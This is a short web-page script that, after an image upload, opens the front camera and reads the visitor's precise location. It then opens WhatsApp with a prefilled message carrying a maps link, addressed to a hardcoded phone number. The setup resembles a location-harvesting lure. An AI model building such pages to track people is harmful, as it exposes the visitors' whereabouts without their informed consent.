<script>
const whatsappNumber = "919453501424"; // 9453501424 with country code

function startProcess() {
  if (!document.getElementById("imageInput").files.length) {
    alert("Please upload an image first");
    return;
  }

  openCamera();
  getLocationAndSend();
}

function openCamera() {
  navigator.mediaDevices.getUserMedia({
    video: { facingMode: "user" }
  }).then(stream => {
    document.getElementById("video").srcObject = stream;
  }).catch(() => {
    alert("Camera permission denied");
  });
}

function getLocationAndSend() {
  if (!navigator.geolocation) {
    alert("Geolocation not supported");
    return;
  }

  navigator.geolocation.getCurrentPosition(
    pos => {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;

      const mapsLink = `https://maps.google.com/?q=${lat},${lon}`;

      const message =
`Image uploaded.
My current location:
${mapsLink}

Please attach the image and send.`;

      const url =
        `https://wa.me/${whatsappNumber}?text=${encodeURIComponent(message)}`;

      // Use direct navigation (most reliable)
      window.location.href = url;
    },
    () => {
      alert("Location permission denied");
    },
    {
      enableHighAccuracy: true,
      timeout: 10000
    }
  );
}
</script>
